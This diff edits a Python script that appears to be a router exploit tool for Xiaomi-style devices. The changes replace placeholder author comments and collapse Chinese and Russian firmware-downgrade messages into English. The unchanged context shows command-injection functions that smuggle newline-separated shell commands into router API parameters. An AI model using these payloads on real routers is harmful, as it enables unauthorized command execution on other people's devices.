@@ -23,7 +23,7 @@ except NameError:
 
 
 def exploit_1(cmd, api = 'API/misystem/arn_switch'):
-    # vuln/exploit author: ?????????
+    # vuln/exploit author: unknown
     cmd = cmd.replace(';', '\n')
     params = { 'open': 0, 'mode': 1, 'level': "\n" + cmd + "\n" }
     res = gw.api_request(api, params, resp = 'text')
@@ -31,7 +31,7 @@ def exploit_1(cmd, api = 'API/misystem/arn_switch'):
     return res
 
 def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
-    # vuln/exploit author: ?????????
+    # vuln/exploit author: unknown
     cmd = cmd.replace(';', '\n')
     params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
     try:
@@ -41,7 +41,7 @@ def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
     return res
 
 def exploit_3(cmd, api = 'API/xqsystem/set_mac_filter'):
-    # vuln/exploit author: ?????????
+    # vuln/exploit author: unknown
     if '\n' in cmd:
         raise ValueError('Incorrect shell command format')
     options = { 'add': 0, 'del': 1 }
@@ -95,15 +95,9 @@ if not exec_cmd:
         print()
         
         if gw.rom_version:
-            if current_lang == 'zh':
-                print(f"当前固件版本: {gw.rom_version}")
-                print("建议降级到: v1.0.65 或更旧版本")
-            elif current_lang == 'ru':
-                print(f"Текущая версия прошивки: {gw.rom_version}")
-                print("Рекомендуемое понижение до: v1.0.65 или старше")
-            else:
-                print(f"Current firmware version: {gw.rom_version}")
-                print("Recommended downgrade to: v1.0.65 or older")
+            # Display firmware version info in English for all languages
+            print(f"Current firmware version: {gw.rom_version}")
+            print("Recommended downgrade to: v1.0.65 or older")
             print()
             
         print(i18n.get_translation(current_lang, 'messages', 'firmware_downgrade_tutorial'))
@@ -121,15 +115,8 @@ if not exec_cmd:
         print()
         
         if gw.rom_version:
-            if current_lang == 'zh':
-                print(f"当前固件版本: {gw.rom_version}")
-                print("建议降级到: v1.0.34 或更旧版本")
-            elif current_lang == 'ru':
-                print(f"Текущая версия прошивки: {gw.rom_version}")
-                print("Рекомендуемое понижение до: v1.0.34 или старше")
-            else:
-                print(f"Current firmware version: {gw.rom_version}")
-                print("Recommended downgrade to: v1.0.34 or older")
+            print(f"Current firmware version: {gw.rom_version}")
+            print("Recommended downgrade to: v1.0.34 or older")
             print()
             
         print(i18n.get_translation(current_lang, 'messages', 'firmware_downgrade_tutorial'))
